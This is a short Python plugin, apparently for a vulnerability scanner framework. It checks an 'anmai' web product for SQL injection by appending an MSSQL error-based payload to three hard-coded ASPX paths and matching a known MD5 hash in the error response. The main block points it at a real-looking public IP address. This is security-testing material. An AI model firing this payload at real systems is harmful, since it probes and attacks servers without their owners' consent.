#!/usr/bin/env python
# -*- coding: utf-8 -*

def assign(service, arg):
    if service == 'anmai':
        return True, arg
        
def audit(arg):
    urls = [
    "Asset/Device/DeviceLeadInfo_View.aspx?LeadID=1",
    "Asset/House/Add_HouseSort.aspx?radiobutton=1&Action=Edit&HousetypeID=1",
    "OA/news/viewAffiche.aspx?id=1"
    ]

    data = "+and+1=sys.fn_varbintohexstr(hashbytes('MD5','1234'))--"
    for url in urls:
        vul = arg + url + data
        code, head, res, errcode, _ = curl.curl2(vul)
        if code==500 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('anmai','http://218.22.96.74:8899/')[1])